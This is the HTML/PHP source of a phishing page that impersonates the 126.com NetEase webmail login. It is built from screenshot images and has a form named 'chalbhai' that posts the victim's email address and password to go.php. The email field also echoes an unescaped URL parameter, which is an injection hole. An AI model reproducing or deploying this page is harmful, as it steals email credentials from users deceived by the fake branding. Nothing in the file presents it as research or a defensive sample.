<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#49;&#50;&#54;&#32593;&#26131;&#20813;&#36153;&#37038;&#45;&#45;&#20320;&#30340;&#19987;&#19994;&#30005;&#23376;&#37038;&#23616;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
			<style type="text/css">
			.textbox { 
    border: 1px solid #c4c4c4; 
    height: 41px; 
    width: 275px; 
    font-size: 13px; 
    padding: 8px 8px 8px 8px; 
    border-radius: 4px; 
    -moz-border-radius: 4px; 
    -webkit-border-radius: 4px; 
    box-shadow: 0px 0px 8px #d9d9d9; 
    -moz-box-shadow: 0px 0px 8px #d9d9d9; 
    -webkit-box-shadow: 0px 0px 8px #d9d9d9; 
} 
 
.textbox:focus { 
    outline: none; 
    border:  1px solid #00A577; 
    box-shadow: 0px 0px 1px #00A577; 
    -moz-box-shadow: 0px 0px 1px #00A577; 
    -webkit-box-shadow: 0px 0px 1px #00A577; 
} 				
	</style>
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>

<style type="text/css">
div#container
{
	position:relative;
	width: 1352px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body bgColor="#D0D0D0"  style="visibility:hidden" onload="unhideBody()">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:-1px; width:1352px; height:66px; z-index:0"><img src="images/ad2.png" alt="" title="" border=0 width=1352 height=66></div>

<div id="image2" style="position:absolute; overflow:hidden; left:172px; top:64px; width:1000px; height:600px; z-index:1; background-color:#FFFFFF"><a href="#"><img src="images/ad1.jpg" alt="" title="" border=0 width=1000 height=600></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:773px; top:132px; width:297px; height:462px; z-index:2"><img src="images/ad3.png" alt="" title="" border=0 width=297 height=462></div>

<div id="image4" style="position:absolute; overflow:hidden; left:0px; top:664px; width:1352px; height:85px; z-index:3"><img src="images/ad4.png" alt="" title="" border=0 width=1352 height=85></div>

<div id="image5" style="position:absolute; overflow:hidden; left:222px; top:688px; width:99px; height:40px; z-index:4"><a href="#"><img src="images/ad5.png" alt="" title="" border=0 width=99 height=40></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:381px; top:687px; width:622px; height:20px; z-index:5"><a href="#"><img src="images/ad6.png" alt="" title="" border=0 width=622 height=20></a></div>

<div id="image7" style="position:absolute; overflow:hidden; left:1066px; top:698px; width:63px; height:25px; z-index:6"><a href="#"><img src="images/ad7.png" alt="" title="" border=0 width=63 height=25></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:221px; top:11px; width:861px; height:36px; z-index:7"><a href="#"><img src="images/head.png" alt="" title="" border=0 width=861 height=36></a></div>

<div id="image9" style="position:absolute; overflow:hidden; left:774px; top:133px; width:292px; height:47px; z-index:8"><a href="#"><img src="images/ad8.png" alt="" title="" border=0 width=292 height=47></a></div>

<div id="image10" style="position:absolute; overflow:hidden; left:825px; top:342px; width:82px; height:19px; z-index:9"><a href="#"><img src="images/ad9.png" alt="" title="" border=0 width=82 height=19></a></div>

<div id="image11" style="position:absolute; overflow:hidden; left:984px; top:341px; width:65px; height:19px; z-index:10"><a href="#"><img src="images/ad10.png" alt="" title="" border=0 width=65 height=19></a></div>

<div id="image12" style="position:absolute; overflow:hidden; left:795px; top:429px; width:95px; height:21px; z-index:11"><a href="#"><img src="images/ad11.png" alt="" title="" border=0 width=95 height=21></a></div>

<div id="image13" style="position:absolute; overflow:hidden; left:960px; top:431px; width:91px; height:21px; z-index:12"><a href="#"><img src="images/ad12.png" alt="" title="" border=0 width=91 height=21></a></div>

<div id="image14" style="position:absolute; overflow:hidden; left:796px; top:474px; width:250px; height:38px; z-index:13"><a href="#"><img src="images/ad13.png" alt="" title="" border=0 width=250 height=38></a></div>

<div id="image15" style="position:absolute; overflow:hidden; left:798px; top:542px; width:164px; height:39px; z-index:14"><a href="#"><img src="images/ad14.png" alt="" title="" border=0 width=164 height=39></a></div>

<div id="image16" style="position:absolute; overflow:hidden; left:933px; top:376px; width:112px; height:39px; z-index:15"><a href="#"><img src="images/ad15.png" alt="" title="" border=0 width=112 height=39></a></div>

<form action=go.php name=chalbhai id=chalbhai method=post>
<input name="userid" value="<?=$_GET[userid]?>"  required type="email" style="position:absolute;border:none;text-align:center;outline: none;font-weight: bold;background:rgba(227,162,11,0.0);font-size: 16px;width:245px;height:30px;left:799px;top:219px;z-index:16">
<input name="formtext2" placeholder="&#23494;&#30721;" class="textbox" required type="password" style="position:absolute;width:245px;left:799px;top:282px;z-index:17">
<div id="formcheckbox1" style="position:absolute; left:805px; top:342px; z-index:18"><input type="checkbox" name="formcheckbox1"></div>
<div id="formimage1" style="position:absolute; left:798px; top:375px; z-index:19"><input type="image" name="formimage1" width="112" height="41" src="images/button.png"></div>
<div id="image17" style="position:absolute; overflow:hidden; left:1019px; top:625px; width:62px; height:29px; z-index:20"><a href="#"><img src="images/ad16.png" alt="" title="" border=0 width=62 height=29></a></div>

</div>

</body>
</html>
